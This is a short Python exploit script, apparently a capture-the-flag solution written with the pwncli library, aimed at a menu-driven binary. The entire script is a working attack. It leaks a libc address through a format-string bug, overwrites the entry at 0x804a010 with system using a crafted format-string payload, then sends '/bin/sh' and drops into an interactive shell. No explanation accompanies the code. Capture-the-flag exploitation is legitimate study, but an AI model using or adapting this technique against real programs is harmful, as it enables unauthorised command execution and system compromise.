from pwncli import *

cli_script()

p = gift['io']
libc = gift['libc']

def fmt_attack(p, fmt):
    p.sendlineafter("3) Exit\n", "1")
    p.sendline(fmt)
    p.sendlineafter("3) Exit\n", "2")
    msg = p.recvline()
    info("msg recv: {}".format(msg))
    return msg


msg = fmt_attack(p, "%275$p")
libc_base_addr = int16(msg.decode()) - libc.sym['__libc_start_main'] -241

libc.address = libc_base_addr
log_address("libc_base_addr", libc_base_addr)

payload = fmtstr_payload(offset=16, writes={0x804a010:libc.sym['system']}, write_size="short", write_size_max="short")

fmt_attack(p, payload)


p.sendlineafter("3) Exit\n", "1")
p.sendline("/bin/sh")
p.sendlineafter("3) Exit\n", "2")

p.interactive()